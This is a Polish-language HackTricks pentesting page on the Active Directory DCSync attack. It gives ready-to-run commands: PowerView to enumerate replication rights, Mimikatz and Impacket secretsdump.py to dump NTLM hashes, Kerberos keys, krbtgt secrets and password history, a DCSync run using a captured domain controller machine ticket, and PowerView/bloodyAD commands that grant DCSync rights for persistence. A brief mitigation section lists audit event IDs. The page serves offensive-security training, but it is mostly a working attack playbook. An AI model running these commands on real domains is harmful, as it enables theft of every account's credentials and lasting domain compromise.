# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Uprawnienie **DCSync** oznacza posiadanie tych uprawnień względem samej domeny: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** oraz **Replicating Directory Changes In Filtered Set**.

**Important Notes about DCSync:**

- Atak **DCSync symuluje zachowanie Domain Controller i prosi inne Domain Controllers o replikację informacji** używając Directory Replication Service Remote Protocol (MS-DRSR). Ponieważ MS-DRSR jest poprawną i niezbędną funkcją Active Directory, nie można go wyłączyć ani deaktivować.
- Domyślnie tylko grupy **Domain Admins, Enterprise Admins, Administrators i Domain Controllers** mają wymagane uprawnienia.
- W praktyce, **pełny DCSync** wymaga **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** na domain naming context. `DS-Replication-Get-Changes-In-Filtered-Set` jest często delegowane razem z nimi, ale samo w sobie jest bardziej istotne do synchronizacji **confidential / RODC-filtered attributes** (na przykład secrets w stylu legacy LAPS) niż do pełnego dumpu krbtgt.
- Jeśli jakiekolwiek hasła kont są przechowywane z reversible encryption, w Mimikatz dostępna jest opcja zwrócenia hasła w clear text

### Enumeration

Sprawdź, kto ma te uprawnienia, używając `powerview`:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Jeśli chcesz skupić się na **non-default principals** z uprawnieniami DCSync, odfiltruj wbudowane grupy z możliwością replikacji i przejrzyj tylko nieoczekiwanych trustees:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Exploit Lokalnie
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Exploit zdalnie
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Praktyczne, zakresowe przykłady:
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync using a captured DC machine TGT (ccache)

W scenariuszach export-mode z unconstrained-delegation możesz przechwycić TGT maszyny Domain Controller (np. `DC1$@DOMAIN` dla `krbtgt@DOMAIN`). Następnie możesz użyć tego ccache do uwierzytelnienia się jako DC i wykonać DCSync bez hasła.
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Uwagi operacyjne:

- **Ścieżka Kerberos w Impacket najpierw dotyka SMB** przed wywołaniem DRSUAPI. Jeśli środowisko wymusza **SPN target name validation**, pełny dump może się nie udać z błędem `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- W takim przypadku albo najpierw zażądaj biletu usługi **`cifs/<dc>`** dla docelowego DC, albo przejdź na **`-just-dc-user`** dla konta, którego potrzebujesz od razu.
- Gdy masz tylko niższe uprawnienia replikacji, synchronizacja w stylu LDAP/DirSync nadal może ujawniać atrybuty **confidential** lub **RODC-filtered** (na przykład legacy `ms-Mcs-AdmPwd`) bez pełnej replikacji krbtgt.

`-just-dc` generuje 3 pliki:

- jeden z **hashami NTLM**
- jeden z **kluczami Kerberos**
- jeden z hasłami jawnymi z NTDS dla wszystkich kont z włączonym [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Użytkowników z reversible encryption możesz znaleźć za pomocą

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

Jeśli jesteś domain admin, możesz nadać te uprawnienia dowolnemu użytkownikowi za pomocą `powerview`:
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Operatorzy Linux mogą zrobić to samo za pomocą `bloodyAD`:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Następnie możesz **sprawdzić, czy użytkownik został poprawnie przypisany** do 3 uprawnień, szukając ich w wyniku (powinieneś móc zobaczyć nazwy uprawnień w polu "ObjectType"):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (Audit Policy for object must be enabled) – Wykonano operację na obiekcie
- Security Event ID 5136 (Audit Policy for object must be enabled) – Obiekt usługi katalogowej został zmodyfikowany
- Security Event ID 4670 (Audit Policy for object must be enabled) – Uprawnienia do obiektu zostały zmienione
- AD ACL Scanner - Twórz i porównuj raporty ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://github.com/fortra/impacket/blob/master/ChangeLog.md](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [https://simondotsh.com/infosec/2022/07/11/dirsync.html](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html

{{#include ../../banners/hacktricks-training.md}}
